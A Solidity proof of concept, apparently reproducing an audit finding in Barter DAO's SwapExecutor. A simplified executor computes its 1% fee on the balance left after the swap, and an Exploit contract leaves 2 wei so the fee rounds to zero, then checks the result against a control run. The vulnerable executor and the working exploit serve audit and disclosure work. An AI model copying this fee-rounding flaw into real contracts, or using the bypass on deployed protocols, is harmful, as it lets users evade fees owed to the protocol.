// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Barter DAO — SwapExecutor takes its fee on the tokenToTransfer balance
    left on the contract after the swap path (MixBytes). The last leg can
    transfer the whole output to the user except 2 wei. The fee base is 2
    and 2 * 1% rounds to 0. Leaving the output on the contract pays the 1% fee. */

contract Cash27744 {
    string public name = "Out";
    string public symbol = "OUT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SwapExecutor27744 {
    uint256 public constant BPS = 10_000;
    uint256 public constant FEE_BPS = 100;
    Cash27744 public token;
    address public feeTo;
    uint256 public feePaid;
    uint256 public feeBase;

    constructor(Cash27744 t, address feeRecipient) {
        token = t;
        feeTo = feeRecipient;
    }

    function execute(address user, bool dustOut) external returns (uint256 fee) {
        uint256 gross = token.balanceOf(address(this));
        if (dustOut) {
            token.transfer(user, gross - 2);
        }
        uint256 amount = token.balanceOf(address(this));
        // @> VULN: the fee is a percentage of the tokenToTransfer still on this contract. Leaving 2 wei rounds that fee to 0.
        feeBase = amount;
        fee = amount * FEE_BPS / BPS;
        if (fee > 0) {
            token.transfer(feeTo, fee);
        }
        uint256 rest = token.balanceOf(address(this));
        if (rest > 0) {
            token.transfer(user, rest);
        }
        feePaid = fee;
    }
}

contract Exploit {
    uint256 public constant GROSS = 1000 ether;
    uint256 public constant FAIR_FEE = 10 ether;
    address public constant FEE_TO = 0x9999999999999999999999999999999999999999;

    Cash27744 public token;
    SwapExecutor27744 public exec;
    Cash27744 public tokenC;
    SwapExecutor27744 public execC;

    uint256 public grossParked;
    uint256 public leftForFee;
    uint256 public feePaid;
    uint256 public attackerGot;
    uint256 public feeToGot;
    uint256 public controlFee;
    uint256 public controlFeeTo;
    uint256 public controlAttacker;

    function run() external {
        token = new Cash27744();
        exec = new SwapExecutor27744(token, FEE_TO);
        tokenC = new Cash27744();
        execC = new SwapExecutor27744(tokenC, FEE_TO);

        token.mint(address(exec), GROSS);
        grossParked = token.balanceOf(address(exec));
        feePaid = exec.execute(address(this), true);
        leftForFee = exec.feeBase();
        attackerGot = token.balanceOf(address(this));
        feeToGot = token.balanceOf(FEE_TO);

        tokenC.mint(address(execC), GROSS);
        controlFee = execC.execute(address(this), false);
        controlFeeTo = tokenC.balanceOf(FEE_TO);
        controlAttacker = tokenC.balanceOf(address(this));

        require(grossParked == GROSS, "gross");
        require(leftForFee == 2, "base");
        require(feePaid == 0, "fee");
        require(attackerGot == GROSS, "attacker");
        require(feeToGot == 0, "fee to");
        require(token.balanceOf(address(exec)) == 0, "exec empty");
        require(controlFee == FAIR_FEE, "control fee");
        require(controlFeeTo == FAIR_FEE, "control fee to");
        require(controlAttacker == GROSS - FAIR_FEE, "control attacker");
    }
}
